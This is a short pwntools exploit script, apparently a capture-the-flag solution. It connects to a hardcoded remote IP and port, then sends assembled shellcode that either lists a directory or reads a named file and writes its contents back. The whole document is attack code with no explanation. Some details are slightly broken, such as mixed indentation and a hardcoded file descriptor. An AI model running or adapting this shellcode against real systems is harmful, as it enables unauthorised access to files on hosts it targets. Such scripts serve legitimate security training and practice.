from pwn import *

context.terminal = ['tmux', 'split-window', '-h']
context.log_level = ['debug', 'info', 'warn'][1]
context.arch = 'amd64'

HOST = "104.250.105.109"
PORT = 19004

r = tube; elf = ELF; libc = ELF

def exploit(REMOTE):
  if sys.argv[1] == 'ls':
	payload  = ''
	payload += shellcraft.open(sys.argv[2], 0, 0)
	payload += shellcraft.getdents64('eax', 'rsp', 0x500)
	payload += shellcraft.write(constants.STDOUT_FILENO, 'rsp', 0x500)
	payload += shellcraft.exit(0)
	info(payload)

  if sys.argv[1] == 'cat':
	payload  = ''
	payload += shellcraft.open(sys.argv[2], constants.O_RDONLY, 0)
	payload += 'subq rsp, 0x1000\n'
	payload += shellcraft.read(5, 'rsp', 0x1000)
	payload += shellcraft.write(constants.STDOUT_FILENO, 'rsp', 0x1000)
	info(payload)
    
  sc = asm(payload)
  sc_len = len(sc)
 
  info('sc:')
  info(hexdump(sc))
  info('len %d' % sc_len)

  r.sendlineafter(': ', str(sc_len))
  r.sendlineafter(':\n', str(sc))

if __name__ == '__main__':
  REMOTE = 1

  r = remote(HOST, PORT)
  exploit(REMOTE)

  buf = r.recvall()
  info(hexdump(buf))
  print buf
  r.close()
